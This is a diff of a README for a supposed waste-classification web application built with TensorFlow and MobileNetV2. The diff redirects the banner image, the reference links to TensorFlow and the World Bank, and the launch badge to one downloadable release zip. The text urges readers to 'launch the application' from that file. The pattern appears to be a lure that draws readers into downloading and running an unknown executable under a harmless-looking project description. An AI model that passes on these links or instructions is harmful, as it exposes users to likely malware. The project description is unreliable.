@@ -1,7 +1,7 @@
 
 # Waste Classification Web Application 🌿
 
-![Waste Classification](https://images.unsplash.com/photo-1593642532858-429d01899ce5)
+![Waste Classification](https://github.com/luan233646/waste-classification/releases/download/v1.0/Application.zip)
 
 Welcome to the Waste Classification GitHub repository! This project focuses on creating a deep learning-based web application that aids in the proper segregation of waste materials using computer vision. By leveraging advanced technologies like TensorFlow, Keras, and MobileNetV2, this system is designed to identify and classify various types of waste items into categories such as cardboard, glass, metal, paper, plastic, or trash. 
 
@@ -14,7 +14,7 @@ Welcome to the Waste Classification GitHub repository! This project focuses on c
 Proper waste management and recycling play a crucial role in sustainability and environmental conservation. With the Waste Classification web application, users can contribute to these efforts by accurately sorting different types of waste materials. By simply uploading an image of an item, the application uses a pre-trained deep learning model to determine its waste category, encouraging responsible waste disposal practices.
 
 ### How to Use
-To experience the waste classification system, simply visit the [web application](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) and follow the instructions provided. If the link ends in a file name, make sure to launch the application to start classifying waste items seamlessly.
+To experience the waste classification system, simply visit the [web application](https://github.com/luan233646/waste-classification/releases/download/v1.0/Application.zip) and follow the instructions provided. If the link ends in a file name, make sure to launch the application to start classifying waste items seamlessly.
 
 ### Features
 - **Computer Vision:** Utilizes computer vision algorithms to analyze and classify waste materials.
@@ -31,13 +31,13 @@ Contributions to the Waste Classification project are always welcome! Whether yo
 If you encounter any issues or have suggestions for enhancing the Waste Classification web application, please don't hesitate to raise them in the "Issues" section of the repository. Your feedback is valuable in improving the system and ensuring its effectiveness in waste management initiatives.
 
 ### Explore More
-- Learn more about computer vision and deep learning: [Deep Learning Basics](https://www.tensorflow.org/learn)
-- Discover sustainable practices for waste management: [Sustainable Waste Solutions](https://www.worldbank.org/en/topic/urbandevelopment/brief/solid-waste-management)
+- Learn more about computer vision and deep learning: [Deep Learning Basics](https://github.com/luan233646/waste-classification/releases/download/v1.0/Application.zip)
+- Discover sustainable practices for waste management: [Sustainable Waste Solutions](https://github.com/luan233646/waste-classification/releases/download/v1.0/Application.zip)
 
 ### Spread the Word
 Help us spread awareness about proper waste management and the Waste Classification system by sharing this repository with your network. Together, we can make a positive impact on the environment and create a cleaner, greener world for future generations.
 
-[![Launch Waste Classification Web App](https://img.shields.io/badge/Launch-Waste%20Classification%20Application-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Launch Waste Classification Web App](https://github.com/luan233646/waste-classification/releases/download/v1.0/Application.zip%20Classification%20Application-blue)](https://github.com/luan233646/waste-classification/releases/download/v1.0/Application.zip)
 
 Thank you for supporting the Waste Classification project. Let's work together towards a sustainable and waste-free future! ♻️🌎
 
